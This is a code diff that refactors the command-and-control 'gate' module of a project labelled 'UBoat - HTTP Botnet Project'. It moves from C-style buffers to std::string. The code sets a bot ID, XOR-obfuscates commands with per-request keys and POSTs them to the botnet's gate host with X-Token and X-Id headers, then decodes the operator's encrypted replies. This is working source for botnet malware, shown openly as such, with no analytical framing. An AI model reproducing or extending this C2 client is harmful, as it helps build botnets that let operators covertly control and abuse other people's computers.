@@ -1,93 +1,80 @@
-#include "Gate.h"
-#include "HttpQuery.h"
-#include "GateHelper.h"
-#include "WebSafeEncryption.h"
-#include "WindowsCompat.h"
+/**
+ * This file is part of UBoat - HTTP Botnet Project
+ */
+
+#include <cstring>
 #include <string>
 
-char* botId = "-1";
+#include "Gate.h"
+#include "GateHelper.h"
+#include "HttpQuery.h"
+#include "WebSafeEncryption.h"
 
-void SetBotId(char* newId) {
-	botId = (char*)malloc(strlen(newId) + 1);
-	botId[strlen(newId)] = 0;
-	memcpy_s(botId, strlen(newId), newId, strlen(newId));
+std::string botId = "-1";
+
+void SetBotId(const std::string& newId)
+{
+    botId.assign(newId);
 }
 
-char* GetBotId() {
-	return botId;
+const std::string& GetBotId()
+{
+    return botId;
 }
 
-char* SendCommandWithDecodedResponse(char* command) {
-	char* key = GenerateKey(32);
-	char* encodedKey;
+std::string SendCommandWithDecodedResponse(const std::string& command)
+{
+    std::string key = GenerateKey(32);
+    XorResult xored = GetEncodedXorResult(command, key);
 
-	char* encodedResult = GetEncodedXorResult(command, key, strlen(command), 32, &encodedKey);
-	FreeKey(key);
+    NameValuePair* headers[] = {
+        new NameValuePair("X-Token", xored.key.c_str()),
+        new NameValuePair("X-Id", GetBotId().c_str()),
+        0
+    };
 
+    NameValuePair* postData[] = {
+        new NameValuePair("x", xored.content.c_str()),
+        0
+    };
 
-	NameValuePair* headers[] = {
-		new NameValuePair("X-Token", encodedKey),
-		new NameValuePair("X-Id", botId),
-		0
-	};
+    NameValuePair** returnedHeaders;
+    char* returnedData;
+    int dataLength;
 
-	NameValuePair* postData[] = {
-		new NameValuePair("x", encodedResult),
-		0
-	};
+    int result = HTTPQuery(GATE_HOST, GATE_PATH, headers, &returnedHeaders, &returnedData, &dataLength, true, "POST", postData);
+#ifdef _DEBUG_
+    printf("HTTPQuery ret: %d.\n", result);
+#endif
 
-	NameValuePair** returnedHeaders;
-	char* returnedData;
-	int dataLength;
+    char* newKey = 0;
 
-	int result = HTTPQuery((char*)GATE_HOST, (char*)GATE_PATH, headers, &returnedHeaders, &returnedData, &dataLength, true, "POST", postData);
-	FreeEncodedXorResult(encodedResult, encodedKey);
+    NameValuePair** headerPointer = returnedHeaders;
 
-	char* newKey = 0;
+    while (headerPointer != 0 && *headerPointer != 0) {
+        if (strcmp((*headerPointer)->Name, "X-Token") == 0) {
+            newKey = (char*)(*headerPointer)->Value;
+            break;
+        }
 
-	NameValuePair** headerPointer = returnedHeaders;
+        headerPointer++;
+    }
 
-	while (headerPointer != 0 && *headerPointer != 0)
-	{
-		if (strcmp((*headerPointer)->Name, "X-Token") == 0)
-		{
-			newKey = (char*)(*headerPointer)->Value;
-			break;
-		}
+    std::string decoded = GetDecodedXorResult(returnedData, newKey);
 
-		headerPointer++;
-	}
+    int i = 0;
+    while (headers[i] != 0) {
+        delete (headers[i]);
+        i++;
+    }
 
+    i = 0;
+    while (postData[i] != 0) {
+        delete (postData[i]);
+        i++;
+    }
 
-	int outputLength;
-	char* output = GetDecodedXorResult(returnedData, newKey, &outputLength);
+    FreeHTTPResponse(returnedHeaders, returnedData);
 
-	char* returnBuffer = (char*)malloc(outputLength + 1);
-	returnBuffer[outputLength] = 0;
-	memcpy_s(returnBuffer, outputLength, output, outputLength);
-
-	FreeDecodedXorResult(output);
-
-
-	int i = 0;
-	while (headers[i] != 0)
-	{
-		delete (headers[i]);
-		i++;
-	}
-
-	i = 0;
-	while (postData[i] != 0)
-	{
-		delete (postData[i]);
-		i++;
-	}
-
-	FreeHTTPResponse(returnedHeaders, returnedData);
-
-	return returnBuffer;
-}
-
-void FreeDecodedResponse(char* response) {
-	free(response);
+    return decoded;
 }
